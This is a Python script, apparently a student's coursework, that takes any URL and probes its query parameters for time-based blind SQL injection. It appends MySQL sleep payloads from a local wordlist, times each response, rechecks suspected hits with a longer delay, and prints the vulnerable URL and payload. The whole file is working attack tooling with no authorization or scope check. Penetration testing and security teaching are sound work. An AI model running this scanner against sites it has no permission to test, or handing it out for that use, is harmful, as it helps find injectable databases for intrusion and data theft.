import requests
from urllib.parse import urlparse, parse_qs
import time
from datetime import datetime

# Configuration for payloads path and logging
PAYLOADS_PATH = ['C:\\Users\\jjag0\\Documents\\Classes\\ACS\\Basic Courses\\Coding\\sql-injection-payload-list-master\\Intruder\\payloads-sql-blind\\MySQL\\SQL-Time.txt']
LOG = 1

def get_processor(url):
    """
    Parses the URL and extracts the network location, path, and query parameters.
    """
    parsed_url = urlparse(url)
    query_parameters_ = parse_qs(parsed_url.query)
    query_parameters = {key: value[0] for key, value in query_parameters_.items()}
    scheme = parsed_url.scheme
    netloc = parsed_url.netloc
    path = parsed_url.path
    return netloc, path, query_parameters

def get_request_send(netloc, path, query_parameters):
    """
    Sends a GET request to the constructed URL with provided query parameters.
    """
    url = f'https://{netloc}{path}?'
    url += '&'.join(f'{key}={value}' for key, value in query_parameters.items())
    try:
        r = requests.get(url=url, timeout=10)
        r.raise_for_status()  # Ensure the request was successful
    except requests.exceptions.RequestException as e:
        print("Error making request: ", e)
        return None, url
    return r, url

def check_compatibility(netloc, path, query_parameters):
    """
    Checks if the website is compatible with this tool by testing basic queries.
    """
    test_payload = "1"
    for key in query_parameters:
        query_parameters_payload = query_parameters.copy()
        query_parameters_payload[key] = query_parameters[key] + test_payload
        r, url_test = get_request_send(netloc, path, query_parameters_payload)
        if r and r.status_code == 200:
            return True
    return False

def process_payload_sleep_get(netloc, path, query_parameters):
    """
    Processes the payloads from the file and tests for SQL injection vulnerabilities.
    """
    for payloads_path in PAYLOADS_PATH:
        try:
            with open(payloads_path, 'r') as f:
                payloads = f.readlines()
        except FileNotFoundError:
            print("Error opening file: ", payloads_path)
            continue
        
        for payload in payloads:
            payload = payload.strip()
            for key, value in query_parameters.items():
                query_parameters_payload = query_parameters.copy()
                query_parameters_payload[key] = value + payload
                
                start_time = time.time()
                r, url_test = get_request_send(netloc, path, query_parameters_payload)
                if r is None:
                    continue
                
                elapsed_time = time.time() - start_time
                
                if LOG == 1:
                    current_time = datetime.now().time().strftime("%H:%M:%S")
                    print(f'[{current_time}] Payload testing: {payload}')
                
                if elapsed_time >= 5:
                    recheck_payload = payload.replace("5", "10")
                    query_parameters_payload[key] = value + recheck_payload
                    
                    if LOG == 1:
                        print(f"[!] Recheck payload: {recheck_payload}")
                    
                    recheck_start_time = time.time()
                    r, url_test = get_request_send(netloc, path, query_parameters_payload)
                    if r is None:
                        continue
                    
                    recheck_elapsed_time = time.time() - recheck_start_time
                    if recheck_elapsed_time >= 10:
                        print('[+] SQL injection vulnerabilities detected')
                        print(f'[+] URL: {url_test}')
                        print(f'[+] Payload: {payload}')
                        return

def main():
    """
    Main function to get user input and start the SQL injection test.
    """
    url = input("Enter the URL: ")
    netloc, path, query_parameters = get_processor(url)
    
    if check_compatibility(netloc, path, query_parameters):
        print("[+] Website is compatible with this tool. Proceeding with the test.")
        process_payload_sleep_get(netloc, path, query_parameters)
    else:
        print("[-] Website is not compatible with this tool. Exiting.")

if __name__ == "__main__":
    main()
